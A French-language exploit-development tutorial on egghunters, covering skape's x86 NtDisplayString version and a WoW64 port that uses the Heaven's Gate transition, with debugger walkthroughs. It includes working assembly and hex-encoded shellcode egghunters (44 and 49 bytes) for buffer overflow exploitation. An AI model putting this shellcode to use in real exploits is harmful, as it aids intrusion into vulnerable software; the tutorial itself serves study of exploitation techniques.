
* Qu'est ce qu'un **egghunter**? 

* A quoi sert un **egghunter**? 

* Pourquoi utiliser un **egghunter**?

Lors de développement d'exploit, vous vous êtes peut-être interrogé sur la notion d'egghunter. Et vous avez probablement déjà trouvé votre bonheur pour des exploits sur des machines XP x86. En revanche, il y a peu de ressources sur les egghunters x64 et x86\_64, mis à part  l'explication de l'excellent __CorelanC0d3r__ (https://www.corelan.be/index.php/2019/04/23/windows-10-egghunter/).

Un egghunter est un morceau de code qui est capable de parcourir la mémoire d'un processus à la recherche d'une suite d'opcodes définis en avance de phase (le __egg__). Lorsque je parle de mémoire d'un processus, j'entend l'ensemble des __adresses virtuelles relatives__ (RVA: Relative Virtual Address space) à l'__EP__ (Entry Point).

* En quoi ce n'est pas trivial?

Certaines sections d'un exécutable, et donc certaines portions de la mémoire, et donc certaines adresses, ne sont pas accessibles en lecture. Nous le savons déjà, les pages de la mémoire sont protégées, et certaines sont accessibles en __RE__ (Read Executable) comme la section __.text__, d'autres en __RW__ (Read Write) comme la section __.data__, etc.

Lorsqu'un bout de code tente de lire le contenu situé à une adresse qui n'est pas __R__ (Readable), une erreur se produit et c'est le mécanisme de gestion d'erreur de Windows qui prend le relais (SEH: Structured Exeption Handler), et on risque de se retrouver avec une erreur __STATUS ACCESS VIOLATION__ (error code: __0xC0000005__). Ce qui bloque l'exécution de notre code. Et ça, on ne le veut pas! Il faut donc que l'__egghunter__ soit capable de déterminer s'il a le droit de lire le contenu situé à telle ou telle adresse et de prévenir les erreurs.

De plus, l'__egghunter__ se doit d'être constitué du plus petit nombre d'instructions possible. En effet, un __egghunter__ est majoritairement utilisé pour des exploits dont le __buffer overflow__ est trop petit pour contenir la payload finale. La payload finale est donc chargée en mémoire par un autre procédé que le __buffer overflow__, tandis que celui-ci s'occupera d'exécuter le __egghunter__ qui trouvera en mémoire la payload précédemment chargée puis qui fera un __jmp__ vers celle-ci.

Afin d'avoir la taille la plus petite possible, le __egghunter__ est codé en assembleur et il n'en existe pas des milliers. L'excellent article de __skape__ (http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) présente les méthodes connues. Il s'agit de petits bijoux d'assembleur car ils ont été écris pour être optimisés à fond les ballons !

Le code suivant présente l'une des méthodes proposée dans l'article de __skape__. Il ne fait que __32 bytes__, ce qui est très petit et permet de faire tout ce qui est décrit plus haut.

```
loop_inc_page:
	or 	dx, 0FFFh
	
loop_inc_one:
	inc 	edx

loop_check:
	push	edx
	push 	80h
	pop 	eax
	int	2Eh
	cmp	al, 5
	pop 	edx

loop_check_8_valid:
	je 	loop_inc_page

is_egg:
	mov 	eax, 41414242 ; AABB
	mov 	edi, edx
	scasd
	jnz 	loop_inc_one
	scasd
	jnz 	loop_inc_one

matched:
	jmp 	edi
```

Cet __egghunter__ utilise la fonction non documentée de Windows (située dans ntdll.dll) __NtDisplayString()__ qui a le syscall __0x80__ sur windows Vista x86. La figure ci-dessous présente comment cette valeur a été trouvée en utilisant __OllyDbg__:_

![image alt text](/images/egghunter/ntdisplaystring_syscall.png)

Cette valeur peut aussi être retrouvée grâce à l'excellent travail de __j00ru__ qui liste les syscalls pour toutes les versions de windows x86/x64 (https://j00ru.vexillium.org/syscalls/nt/32/)

Ainsi on voit que pour appeler __NtDisplayString()__, il faut que le registre __eax__ contienne __0x80__ pour pouvoir effectuer l'appel système avec l'instruction __int 2Eh__ (car x86, pour du x64, il s'agit de syscall), c'est pourquoi on:

```
	push 	80h
	pop 	eax
	int 	2Eh
```

On voit également que __NtDisplayString()__ utilise le registre __edx__. Il faut donc penser à le sauvegarder, puis le restaurer:

```
	push 	edx
	...
	pop 	edx
```

Suite à l'appel système, le code du __egghunter__ vérifie si une portion du retour (eax) de la fonction est égale à __5__. Cette portion de eax qui est vérifié est la partie basse du registre eax: __al__. On a vu plus haut que lorsque le code tente de lire le contenu situé à une adresse mémoire interdite, un code __0xC0000005__ est retourné dans eax. En vérifiant que la partie basse de eax est différent de 5, on s'assure que le code __0xC0000005__ n'est pas retourné.

On vérifie ensuite si le __Zero Flag__ (ZF) est positioné à __1__. Si oui, le code retourne au début du __egghunter__ (loop\_inc\_page). Le __Zero Flag__ peut être mis à __1__ lors de la comparaison de __al__ avec __5__, donc lorsque la lecture d'une adresse n'est pas possible. C'est là que le mécanisme d'authorisation de lecture du contenu d'une adresse a lieu.

Si la lecture est possible, on continue l'execution du code du __egghunter__, sinon on incrémente l'adresse de manière à passer à la page suivante et on vérifie de nouveau.

On comprend alors que __edx__ contient l'adresse à laquelle l'on souhaite lire.

Lorsque l'on arrive à lire le contenu d'une adresse spécifie par edx, on va tenter de déterminer si le contenu situé à cette adresse correspond à notre __egg__ (ici __41414242__). On comprend que l'__egg__ est alors dans __eax__, mais on se souvient que l'on ne lit que 1 byte après l'autre. Ainsi lorsque l'on tombes sur une valeur qui correspond au 1er byte de notre __egg__, il faut faire une boucle pour vérifier les bytes suivants. C'est là qu'intervient le mnémonique __scasd__.

```
	mov 	eax, 41414242 ; AABB
	mov 	edi, edx
	scasd	
```

Que fait ce mnémonique? On peut regarder la documentation d'Intel, ou bien se rendre sur le site de __Felix Cloutier__ (https://www.felixcloutier.com/x86/scas:scasb:scasw:scasd). On comprend alors que cette instruction compare __eax__ (notre __egg__: 41414242) avec __edi__. Ensuite cette instruction met le __Zero Flag__ à __1__ si les 2 registres ont la même valeur et donc si notre __egg__ a été trouvé.

Cependant, il est possible que l'instruction __41414242__ (notre __egg__), puisse exister dans l'entiereté des contenus des adresses virtuelles parcouru. En revanche on fait l'hypothèse qu'il y a peu de chance que notre __egg__ apparaisse deux fois de suite, c'est pourquoi la méthode d'identification de notre __egg__ est effecutée 2 fois.

On comprend l'importance de choisir un __egg__ qui ne risque pas d'exister naturellement dans du code. Je pense que __4141424241414242__ à peu de chance de se trouver naturellement dans du code, donc je me permets de l'utiliser comme __egg__.

Et enfin, si notre __egg__ est trouvé, alors on se rend à son adresse avec un:

```
	jmp 	edi
```

Revenons sur la première instruction de notre __egghunter__:

```
	or 	dx, 0FFFh
```

Il s'agit d'un __ou logique__ (c'est donc un mnémonique qui agit directement sur les bits) qui permet de se rendre à la dernière adresse de la page n. Ainsi, si __edx = 00401040__, cette instruction mettra __00401FFF__ dans __edx__. En incrémentant de __1__, on obtient alors __edx = 00402000__ et on commence au début de la page suivante n+1. Une page (x86 ou x64) fait __4 kB__, soit __0x1000 bytes__, on avancera de page en page par block de 0x1000 jusqu'à tomber sur une page accessible en lecture, à partir de laquelle on tentera de lire chaques adresses une à une. Donc l'instruction __or dx, 0FFFh__ restera la même en 32 bits et en 64 bits pour ceux qui se seraient posé la question.

Pour une architecture 64 bits, l'espace des adresses virtuelles adressables est 2^64 tandis que pour une architecture 32 bits, l'espace des adresses virtuelles adressables est beaucoup moindre (4 GB). Ainsi il prendra beaucoup plus de temps pour un __egghunter__ de parcourir la mémoire sur une architecture 64 bits que sur une architecture 32 bits. Cela nous laisse réfléchir quant à l'utilité d'utiliser un egghunter sur un processus 64 bits ...

Un autre point intéressant qu'il me semble nécessaire de soulever, et que trop peu de ressources sur Internet n'osent discuter, est l'utilisation de la fonction __NtDisplayString()__. Pourquoi avoir choisi cette fonction pour réaliser le __egghunter__. Cette fonction permet d'afficher du texte lorsque l'OS plante, oui, sur les blue screen. Mais ce n'est pas pour ça qu'elle est utilisée. 

Lorsque l'on désassemble cette fonction, on se rend compte qu'elle ne prend qu'un paramètre, ce qui évite de faire n'importe quoi en ne sachant pas ce qui va être chargé dans la fonction. Mais ne nous prenons pas la tête à desassembler cette fonction quand d'autres l'on déjà fait pour nous ... Regardons du côté du code de ReactOS (https://doxygen.reactos.org/db/dc9/nt\__native\_8h.html#a1b455a484c8f8e70b8ef66b4f9741946).

On voit que le prototype de cette fonction est:

```
NTSTATUS NTAPI NtDisplayString(
	PUNICODE_STRING String
);
```

C'est donc la **String** qui est affiché à l'écran bleue. Elle est donc contenue à une adresse qui est __lue__ uniquement (pas d'écriture). Ainsi il n'y a pas de modification de la mémoire du process en mode utilisateur (on ne s'aventure pas sur ce qu'il se passe dans le monde du noyau ici) suite à l'exécution de cette fonction. Il s'agit donc d'une fonction de choix pour un **egghunter**. Dans ce cas, la **string** qui est lue est celle qui est poussée sur la stack (convention d'appel x86), et il s'agit de ce qui est contenu à l'adresse pointée par edx. C'est également pour ça qu'on pousse edx sur la stack.

On se rend alors compte que ce n'est pas une fonction unique et indispensable à notre __egghunter__. Il doit en exister d'autres. Il suffit de les trouver. Certains utilisent d'ailleurs __NtAccessCheckAndAuditAlarm()__. 

On peut aussi noter que du fait d'utiliser l'instruction __or dx, 0FFFh__, on s'assure de chercher dans des adresses plus grandes que celle où est chargé le __egghunter__ en mémoire. On ne cherche donc pas dans les adresses inférieures. Si l'on souhaite chercher dans cette portion de la mémoire, il faut au préalable spécifier la valeur de __edx__ (xor edx, edx par example). Ceci est un postulat que le __egg__ que l'on cherche est situé sur la stack. Pour s'en convraince, rien de mieux que le debugger et d'observer par soi-même le comportement du __egghunter__.

Une dernière chose à ajouter concernant cette version du __egghunter x86__ avant de s'attaquer au __egghunter wow64__ est qu'il ne doit pas contenir de __null bytes__. En effet, un __egghunter__ est utilisé lors d'un exploit d'un logiciel suite à un buffer overflow, dont le buffer disponible est trop petit pour contenir la payload finale (qui aura donc été chargée en mémoire par un autre biais). Si le buffer overflow est disponible via le réseau, il faut savoir qu'envoyer des bytes suivis d'un zéro (null byte) indique la fin du contenu. On ne chargerait donc pas le __egghunter__ en entier. De plus, il peut être intéressant de s'assurer qu'il ne contient pas non plus de __0x0A__ et de __0x0D__.

Le système __wow64__ permet d'exécuter du code 32 bits sur un système 64 bits. Lors des appels systèmes, il doit donc y avoir une transition vers du code 64 bits. Les DLLs WoW64 utilisées ne sont pas situées dans C:>Windows>System32, mais dans C:>Windows>SysWOW64.

Désassemblons la fonction __NtDisplayString()__ situées dans __ntdll.dll__ (fonctions natives de windows non documentées) dans le dossier __SysWOW64__.

![image alt text](/images/egghunter/ntdisplaystring_wow64.png)

Et comparons avec la même fonction située dans __ntdll.dll__ située dans le dossier __System32__

![image alt text](/images/egghunter/ntdisplaystring_x64.png)

La première chose que l'on remarque est que le nom de la fonction n'est plus exactement le même. D'un côté on a __NtDisplayString()__ et de l'autre on a __ZwDisplayString()__. En soit cela ne pose pas de problème. Cela veut simplement dire que lorsque l'on utilise cette fonction, une vérification de la provenance du code (monde utilisateur / monde noyau) est effectuée.

On y remarque également que le numéro d'appel système est __0xD6__ pour la version __x64__, ce qui est exactement le numéro de syscall que l'on a vu pour la version __x64__. On en conclut que __eax__ sera utilisé plus tard pour effectuer la transition versle code __x64__.

On voit que la transition vers le code __x64__ est effectué à l'aide d'un __call edx__. Il va falloir debugger pour voir ce qu'il se passe derrière cela. Mais avant de debugger, regardons ce que contient __edx__. On voit que __edx__ contient l'adresse de la fonction __Wow64SystemServiceCall()__. En y regardant de plus près, on y voit ce qui semble très intéressant.

![image alt text](/images/egghunter/ntdisplaystring_wow64_transition.png)

Effectivement, on est bien sur une transition vers du code 64 bits grâce à ce __jump__. On est sur la bonne voie !

Pour debugger le __egghunter__, on va l'inclure dans un programme. On modifie le numéro d'appel système que l'on avait sur la Windows Vista x86 (__0x80__) en y mettant celui du Windows 10 x64 (__0xD6__). On y ajoute un __egg__ en mettant sur la stack deux fois __AABB__. Le code est présenté ci-dessous:

```

.586
.model flat, stdcall

.code

Start PROC

	push 	41414242h ; egg pushed onto stack
	push 	41414242h

loop_inc_page:
        or      dx, 0FFFh
 
loop_inc_one:
        inc     edx
 
loop_check:
        push    edx
        push    0D6h
        pop     eax
        int     2Eh
        cmp     al, 5
        pop     edx
 
loop_check_8_valid:
        je      loop_inc_page
 
is_egg:
        mov     eax, 41414242h ; AABB
        mov     edi, edx
        scasd
        jnz     loop_inc_one
        scasd
        jnz     loop_inc_one
 
matched:
        jmp     edi
	
Start ENDP
END
```

La figure suivante montre le __egghunter__ dans le __x64dbg__ en version 32 bits sur un windows 10 64 bits.

![image alt text](/images/egghunter/egghunter_test_wow64.png)

L'__egg__ est poussé sur la stack (succession de 2 push) à l'adresse pointée par le registre __esp__ (__006FFCB0__). On y voit que l'entry point est à l'adresse __00111000__, ainsi lorsque l'instruction __or dx, 0FFFh__ puis __inc edx__ sera exécuté, le egghunter commencera à chercher l'__egg__  à l'adresse __00112000__, ce qui est inférieur à l'adresses de la stack. On devrait donc tomber sur notre __egg__.

En exécutant le programme **step by step** avaec la touche __F7__, on tombe sur une exception avec un code d'erreur __C0000005__ (EXCEPTION ACCESS VIOLATION). au niveau de l'instruction __int 2Eh__. Apparemment on n'a plus le droit d'exécuter cette instruction en wow64.

Ce n'est pas étonnant, on a vu plus haut qu'il n'y avait pas d'appel système de cette manière en wow64. Il y a donc un mécanime qui permet de passer du code 32 bits au code 64 bits (wow64: Windows 32 bits on Windows 64 bits), et le mécanisme qui permet cela est appelé l'__Heaven's Gate__.

Lorsque l'on regarde le __TEB__ (Thread Environment Block: structure que tout thread possède et qui contient des informations sur celui-ci), on constate qu'il y a effectivement un mécanisme pour l'__Heaven's Gate__. Ci-dessous le moyen de trouver le __TEB32__ avec __windbg__:

![image alt text](/images/egghunter/teb32.png)

Une partie du contenu du __TEB32__ est présenté ci-dessous:

![image alt text](/images/egghunter/teb32_2.png)

On y voit qu'à l'offset __0xC0__ on y trouve une section reservée qui semble interessante (n'oublions pas que le __TEB32__ se trouve dans le segment __FS__, tandis que le __TEB64__ dans le segment __GS__. Nous aurons besoin par la suite de cette information). Regardons ce que contient cette adresse:

![image alt text](/images/egghunter/kiFastSystemCall.png)

Et voilà ce qui semble être une transition vers du code 64 bits ! Ceci grâce à la fonction __KiFastSystemCall()__ qui est dans la dll __wow64cpu.dll__. On peut donc estimer que remplacer __int 2Eh__ par __call fs:[0C0h]__ permettra d'effectuer une transition vers du code 64 bits (Heaven's Gate): et cela fonctionne !

Cependant, quand on débugge on n'obtiens que des erreurs __C0000005__ signifiant que la page n'est pas accessible en lecture. Et ce même lorsque je spécifie une page de mon code, ou la stack. Il y a donc un problème. Regardons l'erreur avec Windbg.

![image alt text](/images/egghunter/egghunter_error.png)

On voit bien que l'erreur est un __C0000005__ qui provient de la fonction __whNtDisplayString()__ qui est dans la DLL __wow64.dll__. Le code plante donc une fois que l'on a traversé l'heaven's gate et donc que l'on est dans du code x64. Le code qui m'a permit de la générer est le suivant:

```
.586
.model flat, stdcall

.code

Start PROC

	push 	41414141h ; egg pushed onto stack
	push 	41414141h

	xor edx, edx ; to start looking address from 0x1000
loop_inc_page:
        or      dx, 0FFFh
 
loop_inc_one:
		xor ebx, ebx
        inc     edx
 
loop_check:
        push    edx
        mov	bl, 0D6h ; system number of NtDislayString
        push 	ebx
        pop     eax
        mov 	bl, 0C0h ; to jump to x64 code
        assume fs:nothing
        mov 	ebx,fs:[ebx]
        call 	ebx
        assume fs:error
        pop     edx
        cmp     al, 5
        
 
loop_check_8_valid:
        je      loop_inc_page
 
is_egg:
        mov     eax, 41414141h ; AABB
        mov     edi, edx
        scasd
        jnz     loop_inc_one
        scasd
        jnz     loop_inc_one
 
matched:
        jmp     edi
	
Start ENDP
END
```

On voit également que le code plante car __mov eax,dword ptr [rcx+4]__. On voit qu'il y a du __rcx__, on a donc bien sauté sur du code x64. De plus, il faut se souvenir de la convention d'appel x64. Sur du x86, les arguments sont poussés sur la stack, tandis que sur du x64, les 4 premiers arguments sont dans rcx, rdx, r8, r9 et les autres sur la stack. L'erreur provient donc du fait qu'un argument que l'on pousse sur la stack ne peut pas être mis dans eax. Comme on maitrise le code, on peut pousser sur la stack l'argument qui nous convient afin qu'il se retrouve dans rcx une fois que l'on aura passer l'heaven's gate.

Avant cela, regardons le code de la fonction à laquelle le code plante. Il s'agit de __whNtDisplayString()__ située dans la DLL __wow64cpu.dll__:

![image alt text](/images/egghunter/whntdisplaystring.png)

On y voit bien l'instruction qui provoque une erreur. Pour corriger cela, il va falloir pousser un argument supplémentaire (__rcx+4__) sur la stack. On va y mettre 0, et il faudra ensuite rétablir la stack une fois le call effectué. Les modifications sont comme suit:

```
loop_check:
        push    edx
        push 	ebx
        mov	bl, 0D6h
        push 	ebx
        pop     eax
        mov 	bl, 0C0h
        assume fs:nothing
        mov 	ebx,fs:[ebx]
        call 	ebx
        assume fs:error
        add 	esp, 4
        pop     edx
        cmp     al, 5
```

Le code final du __egghunter__ utilisant __NtDisplayString()__ est présenté ci-dessous:

```
loop_inc_page:
        or      dx, 0FFFh
 
loop_inc_one:
	xor 	ebx, ebx
        inc     edx
 
loop_check:
        push    edx
        push 	ebx
        mov	bl, 0D6h
        push 	ebx
        pop     eax
        mov 	bl, 0C0h
        assume fs:nothing
        mov 	ebx,fs:[ebx]
        call 	ebx
        assume fs:error
        add 	esp, 4
        pop     edx
        cmp     al, 5
        
loop_check_8_valid:
        je      loop_inc_page

is_egg:
        mov     eax, 77303074h ; W00T
        mov     edi, edx
        scasd
        jnz     loop_inc_one
        scasd
        jnz     loop_inc_one
 
matched:
        jmp     edi
```

La version hexa est la suivante:

```
6681CAFF0F33DB425253B3D65358B3C0648B1BFFD383C4045A3C0574E3B8743030778BFAAF75DEAF75DBFFE7
```

Cet __egghunter__ contient __44 bytes__, et utilise la fonction __NtDisplayString()__. Pour se rendre compte de son fonctionnement, il faut surtout prendre le temps de le debugger pour s'assurer de son efficacité.

Maintenant que l'on a compris comment fonctionne un __egghunter__ et que l'on a aussi comprit comment fonctionne le mécanisme __wow64__, on peut s'amuser à trouver d'autres syscall qui feraient l'affaire. Ainsi, plutôt que d'utiliser ce que tout le monde utilise: __NtDisplayString()__ ou __NtAccessCheckAndAuditAlarm()__, on peut se la jouer freestyle ^^

Ci-dessous un egghunter qui utilise __ZwLoadDriver()__:

```
loop_inc_page:
        or      dx, 0FFFh
 
loop_inc_one:
	xor 	ebx, ebx
        inc     edx
 
loop_check:
        push    edx
        push 	ebx
        mov	bx, 101h
        dec     ebx
        push 	ebx
        pop     eax
        xor 	ebx, ebx
        mov 	bl, 0C0h
        assume fs:nothing
        mov 	ebx,fs:[ebx]
        call 	ebx
        assume fs:error
        add 	esp, 4
        pop     edx
        cmp     al, 5
        
 
loop_check_8_valid:
        je      loop_inc_page

is_egg:
        mov     eax, 77303074h ; W00T
        mov     edi, edx
        scasd
        jnz     loop_inc_one
        scasd
        jnz     loop_inc_one
 
matched:
        jmp     edi
```

Il y a très peu de changement par rapport au précédent. Il ne fait que __49 bytes__. C'est un peu plus gros que celui qui utilise __NtDisplayString()__.

La version hexa est présentée ci-dessous:

```
6681CAFF0F33DB42525366BB01014B535833DBB3C0648B1BFFD383C4045A3C0574DEB8743030778BFAAF75D9AF75D6FFE7
```

Il est aussi possible d'utiliser la fonction __ZwDreawText()__ (syscall __0xD7__, taille: 44 bytes). En fait, il n'y a vraiment plus qu'à s'amuser et explorer toutes les fonctions de ntdll.dll ...

Il faut toutefois noter qu'un egghunter qui fonctionne pour du wow64 ne fonctionne pas pour du 32 bits (naturellement à cause du __call fs:[0xC0]__). Il est alors possible d'ajouter un check qui vérifie si l'on est sur du wow64 ou du 32 bits en regardant la valeur qui se trouve dans le segment de code (__cs__). Pour un environement 32 bits pur, cette valeur vaut __0x23__, tandis que pour un environement wow64 elle vaut __0x33__. Ce check peut se faire ainsi:

```
mov 	bx, cs
cmp 	bl, 023h
je	blip
jne 	blop
```

Cela augmentera cependant de quelques bytes le volume du __egghunter__, mais a la particularité d'être générique.


